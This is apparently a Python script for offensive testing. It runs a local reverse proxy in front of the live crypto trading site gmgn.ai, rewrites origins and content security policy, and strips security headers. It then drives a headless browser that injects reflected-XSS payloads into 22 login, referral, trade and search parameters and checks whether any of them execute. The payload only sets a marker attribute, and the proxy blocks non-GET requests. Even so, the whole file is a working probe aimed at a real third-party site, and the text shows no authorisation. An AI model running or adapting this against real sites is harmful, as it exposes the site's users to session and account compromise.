from __future__ import annotations

import asyncio
import gzip
import html
import http.server
import json
import socket
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
import zlib
from pathlib import Path
from typing import Any

from playwright.async_api import Browser, Page, Route, async_playwright

UPSTREAM = "https://gmgn.ai"
UA = (
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)
OUT = Path("gmgn_get_proxy_dom_probe.json")
LOG = Path("gmgn_get_proxy_requests.json")
MAX_BODY = 25_000_000
NAV_TIMEOUT_MS = 28_000
SETTLE_MS = 2_200

ROUTE_PARAMS: tuple[tuple[str, str], ...] = (
    ("/", "q"),
    ("/", "search"),
    ("/", "invite_code"),
    ("/login", "redirect"),
    ("/login", "returnUrl"),
    ("/login", "callback"),
    ("/tglogin", "state"),
    ("/tglogin", "redirect"),
    ("/rewards", "invite_code"),
    ("/rewards", "referral_code"),
    ("/invite", "invite_code"),
    ("/referral", "referral_code"),
    ("/discover", "q"),
    ("/discover", "search"),
    ("/trenches", "q"),
    ("/trenches", "search"),
    ("/trade", "token"),
    ("/trade", "address"),
    ("/portfolio", "address"),
    ("/watchlist", "search"),
    ("/profile", "name"),
    ("/settings", "message"),
)

TEXT_TYPES = (
    "text/html",
    "text/css",
    "application/javascript",
    "text/javascript",
    "application/json",
    "text/plain",
    "application/manifest+json",
)
DROP_HEADERS = {
    "content-length",
    "content-encoding",
    "transfer-encoding",
    "connection",
    "strict-transport-security",
    "set-cookie",
    "content-security-policy-report-only",
    "report-to",
    "nel",
    "alt-svc",
}


class ProxyState:
    def __init__(self) -> None:
        self.local_origin = ""
        self.requests: list[dict[str, Any]] = []
        self.lock = threading.Lock()

    def record(self, item: dict[str, Any]) -> None:
        with self.lock:
            self.requests.append(item)
            LOG.write_text(json.dumps(self.requests, indent=2), encoding="utf-8")


STATE = ProxyState()


def decode_body(raw: bytes, encoding: str | None) -> bytes:
    if not encoding:
        return raw
    encoding = encoding.lower().strip()
    try:
        if encoding == "gzip":
            return gzip.decompress(raw)
        if encoding == "deflate":
            return zlib.decompress(raw)
    except Exception:
        return raw
    return raw


def rewrite_text(body: bytes, content_type: str) -> bytes:
    if not any(kind in content_type.lower() for kind in TEXT_TYPES):
        return body
    text = body.decode("utf-8", errors="replace")
    local = STATE.local_origin
    replacements = (
        ("https:\\/\\/gmgn.ai", local.replace("/", "\\/")),
        ("https://gmgn.ai", local),
        ("wss://gmgn.ai", local.replace("http://", "ws://")),
        ("//gmgn.ai", "//" + urllib.parse.urlparse(local).netloc),
    )
    for old, new in replacements:
        text = text.replace(old, new)
    return text.encode("utf-8")


def rewrite_csp(value: str) -> str:
    local = STATE.local_origin
    parsed = urllib.parse.urlparse(local)
    ws_local = f"ws://{parsed.netloc}"
    return (
        value.replace("https://gmgn.ai", local)
        .replace("wss://gmgn.ai", ws_local)
        .replace("https://*.gmgn.ai", local)
        .replace("wss://*.gmgn.ai", ws_local)
    )


class Handler(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def log_message(self, format: str, *args: object) -> None:
        return

    def do_HEAD(self) -> None:
        self._proxy(False)

    def do_GET(self) -> None:
        self._proxy(True)

    def do_POST(self) -> None:
        self._blocked()

    def do_PUT(self) -> None:
        self._blocked()

    def do_PATCH(self) -> None:
        self._blocked()

    def do_DELETE(self) -> None:
        self._blocked()

    def _blocked(self) -> None:
        STATE.record(
            {
                "method": self.command,
                "path": self.path,
                "blocked": True,
                "timestamp": time.time(),
            }
        )
        body = b'{"error":"GET-only research proxy"}'
        self.send_response(405)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(body)

    def _proxy(self, include_body: bool) -> None:
        start = time.time()
        parsed = urllib.parse.urlsplit(self.path)
        upstream_url = urllib.parse.urlunsplit(
            ("https", "gmgn.ai", parsed.path or "/", parsed.query, "")
        )
        headers = {
            "User-Agent": UA,
            "Accept": self.headers.get("Accept", "*/*"),
            "Accept-Language": self.headers.get("Accept-Language", "en-US,en;q=0.8"),
            "Referer": UPSTREAM + "/",
            "Origin": UPSTREAM,
            "Cache-Control": "no-cache",
        }
        request = urllib.request.Request(
            upstream_url,
            headers=headers,
            method="GET" if include_body else "HEAD",
        )
        status: int | None = None
        error: str | None = None
        raw = b""
        response_headers: dict[str, str] = {}
        try:
            with urllib.request.urlopen(request, timeout=28) as response:
                status = response.status
                raw = response.read(MAX_BODY) if include_body else b""
                response_headers = {
                    key.lower(): value for key, value in response.headers.items()
                }
        except urllib.error.HTTPError as exc:
            status = exc.code
            raw = exc.read(min(MAX_BODY, 2_000_000)) if include_body else b""
            response_headers = {
                key.lower(): value for key, value in exc.headers.items()
            }
            error = str(exc)
        except Exception as exc:  # noqa: BLE001
            error = f"{type(exc).__name__}: {exc}"

        if status is None:
            body = error.encode("utf-8", errors="replace") if error else b"proxy error"
            self.send_response(502)
            self.send_header("Content-Type", "text/plain")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Connection", "close")
            self.end_headers()
            if include_body:
                self.wfile.write(body)
            STATE.record(
                {
                    "method": self.command,
                    "path": self.path,
                    "upstream": upstream_url,
                    "status": None,
                    "error": error,
                    "blocked": False,
                    "duration_ms": round((time.time() - start) * 1000, 1),
                }
            )
            return

        raw = decode_body(raw, response_headers.get("content-encoding"))
        content_type = response_headers.get("content-type", "application/octet-stream")
        body = rewrite_text(raw, content_type) if include_body else b""
        self.send_response(status)
        for key, value in response_headers.items():
            if key in DROP_HEADERS:
                continue
            if key == "content-security-policy":
                value = rewrite_csp(value)
            try:
                self.send_header(key, value)
            except Exception:
                pass
        self.send_header("Content-Length", str(len(body)))
        self.send_header("Cache-Control", "no-store")
        self.send_header("Connection", "close")
        self.end_headers()
        if include_body and body:
            self.wfile.write(body)

        STATE.record(
            {
                "method": self.command,
                "path": self.path,
                "upstream": upstream_url,
                "status": status,
                "content_type": content_type,
                "upstream_bytes": len(raw),
                "served_bytes": len(body),
                "error": error,
                "blocked": False,
                "duration_ms": round((time.time() - start) * 1000, 1),
            }
        )


class ThreadedServer(http.server.ThreadingHTTPServer):
    daemon_threads = True


def free_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])


def build_cases(local_origin: str) -> list[dict[str, str]]:
    output: list[dict[str, str]] = []
    for index, (route, param) in enumerate(ROUTE_PARAMS, start=1):
        marker = f"GMGNPROXY{index:03d}"
        payload = (
            f'''"><img src=x onerror="document.documentElement.setAttribute('data-gmgn-proxy-xss','{marker}')">'''
        )
        query = urllib.parse.urlencode({param: payload})
        output.append(
            {
                "route": route,
                "param": param,
                "marker": marker,
                "payload": payload,
                "url": f"{local_origin}{route}?{query}",
            }
        )
    return output


async def test_case(page: Page, case: dict[str, str]) -> dict[str, Any]:
    result: dict[str, Any] = {
        **case,
        "status": None,
        "final_url": None,
        "executed": False,
        "reflected_in_dom": False,
        "raw_marker_elements": 0,
        "dialogs": [],
        "console_errors": [],
        "error": None,
    }

    async def on_dialog(dialog) -> None:
        result["dialogs"].append(dialog.message)
        try:
            await dialog.dismiss()
        except Exception:
            pass

    def on_console(message) -> None:
        if message.type == "error":
            result["console_errors"].append(message.text[:500])

    page.on("dialog", on_dialog)
    page.on("console", on_console)
    try:
        response = await page.goto(
            case["url"],
            wait_until="domcontentloaded",
            timeout=NAV_TIMEOUT_MS,
        )
        result["status"] = response.status if response else None
        result["final_url"] = page.url
        await page.wait_for_timeout(SETTLE_MS)
        state = await page.evaluate(
            """marker => {
              const html = document.documentElement.outerHTML;
              const elements = Array.from(document.querySelectorAll('*')).filter(el =>
                (el.outerHTML || '').includes(marker)
              );
              return {
                attr: document.documentElement.getAttribute('data-gmgn-proxy-xss'),
                htmlHasMarker: html.includes(marker),
                rawMarkerElements: elements.length,
                title: document.title,
                bodyText: (document.body?.innerText || '').slice(0, 500),
              };
            }""",
            case["marker"],
        )
        result["executed"] = state.get("attr") == case["marker"]
        result["reflected_in_dom"] = bool(state.get("htmlHasMarker"))
        result["raw_marker_elements"] = int(state.get("rawMarkerElements") or 0)
        result["dom_state"] = state
    except Exception as exc:  # noqa: BLE001
        result["error"] = f"{type(exc).__name__}: {exc}"
        try:
            result["final_url"] = page.url
        except Exception:
            pass
    finally:
        try:
            page.remove_listener("dialog", on_dialog)
            page.remove_listener("console", on_console)
        except Exception:
            pass
    return result


async def run_probe(local_origin: str) -> dict[str, Any]:
    cases = build_cases(local_origin)
    results: list[dict[str, Any]] = []
    async with async_playwright() as playwright:
        browser: Browser = await playwright.chromium.launch(
            headless=True,
            args=["--disable-dev-shm-usage", "--no-sandbox"],
        )
        context = await browser.new_context(
            user_agent=UA,
            ignore_https_errors=True,
            viewport={"width": 1280, "height": 900},
            locale="en-US",
        )
        page = await context.new_page()

        async def route_handler(route: Route) -> None:
            url = route.request.url
            if url.startswith(STATE.local_origin):
                await route.continue_()
                return
            parsed = urllib.parse.urlparse(url)
            if parsed.hostname == "gmgn.ai":
                local_url = STATE.local_origin + parsed.path
                if parsed.query:
                    local_url += "?" + parsed.query
                await route.continue_(url=local_url)
                return
            if route.request.resource_type in {"font", "media"}:
                await route.abort()
                return
            await route.continue_()

        await page.route("**/*", route_handler)
        for case in cases:
            result = await test_case(page, case)
            results.append(result)
            partial = build_report(cases, results)
            OUT.write_text(json.dumps(partial, indent=2, ensure_ascii=False), encoding="utf-8")
            print(
                "CASE",
                json.dumps(
                    {
                        "route": result["route"],
                        "param": result["param"],
                        "status": result["status"],
                        "executed": result["executed"],
                        "reflected": result["reflected_in_dom"],
                        "final_url": result["final_url"],
                        "error": result["error"],
                    },
                    sort_keys=True,
                ),
                flush=True,
            )
            if result["executed"]:
                break
            try:
                await page.evaluate(
                    "document.documentElement.removeAttribute('data-gmgn-proxy-xss')"
                )
            except Exception:
                pass
            await page.wait_for_timeout(150)
        await context.close()
        await browser.close()
    return build_report(cases, results)


def build_report(cases: list[dict[str, str]], results: list[dict[str, Any]]) -> dict[str, Any]:
    executed = [result for result in results if result["executed"]]
    reflected = [result for result in results if result["reflected_in_dom"]]
    with STATE.lock:
        request_copy = list(STATE.requests)
    return {
        "scope": "unauthenticated browser execution through a GET/HEAD-only local reverse proxy",
        "local_origin": STATE.local_origin,
        "summary": {
            "cases_planned": len(cases),
            "cases_run": len(results),
            "executed": len(executed),
            "reflected_in_dom": len(reflected),
            "navigation_errors": sum(1 for result in results if result["error"]),
            "proxy_requests": len(request_copy),
            "blocked_non_get_requests": sum(1 for item in request_copy if item.get("blocked")),
            "upstream_http_200": sum(1 for item in request_copy if item.get("status") == 200),
            "upstream_http_403": sum(1 for item in request_copy if item.get("status") == 403),
        },
        "executed_cases": executed,
        "reflected_cases": reflected,
        "results": results,
        "proxy_requests": request_copy,
    }


def main() -> int:
    port = free_port()
    STATE.local_origin = f"http://127.0.0.1:{port}"
    server = ThreadedServer(("127.0.0.1", port), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        report = asyncio.run(run_probe(STATE.local_origin))
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=3)
    OUT.write_text(json.dumps(report, indent=2, ensure_ascii=False), encoding="utf-8")
    print(json.dumps(report["summary"], indent=2))
    print(f"WROTE {OUT} ({OUT.stat().st_size} bytes)")
    print(f"WROTE {LOG} ({LOG.stat().st_size if LOG.exists() else 0} bytes)")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
